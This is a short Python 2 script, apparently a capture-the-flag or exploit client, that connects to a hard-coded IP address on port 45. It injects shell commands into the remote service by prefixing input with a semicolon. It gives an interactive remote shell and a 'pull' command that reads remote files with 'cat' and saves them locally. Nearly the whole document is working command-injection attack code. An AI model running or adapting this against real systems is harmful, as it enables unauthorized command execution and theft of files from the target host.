#!/usr/bin/env python

import socket
import sys
import os

HOST = "142.93.118.186"
PORT = 45
helptext = '''shell Drop into an interactive shell and allow users to gracefully exit
pull <remote-path> <local-path> Download files
help Shows this help menu
quit Quit the shell'''

shell = False

while True:

    to_send = raw_input("$ ")

    if to_send == "quit":
        s.close()
        sys.exit(0)

    elif "pull" in to_send:
        cmd = to_send.split(" ")
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((HOST, PORT))
        s.recv(1024)
        file = s.send("; cat %s\n" % cmd[1])
        with open(cmd[2], "wb") as f:
            f.write(s.recv(9999999))

    elif "help" == to_send:
        print helptext

    elif "shell" == to_send:
        while True:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((HOST, PORT))
            s.recv(1024)
            to_send = raw_input("<remote> $ ")
            if to_send == "exit":
                break
            s.send("; %s\n" % to_send)
            print s.recv(1024)
            s.close()
    else:
        print helptext
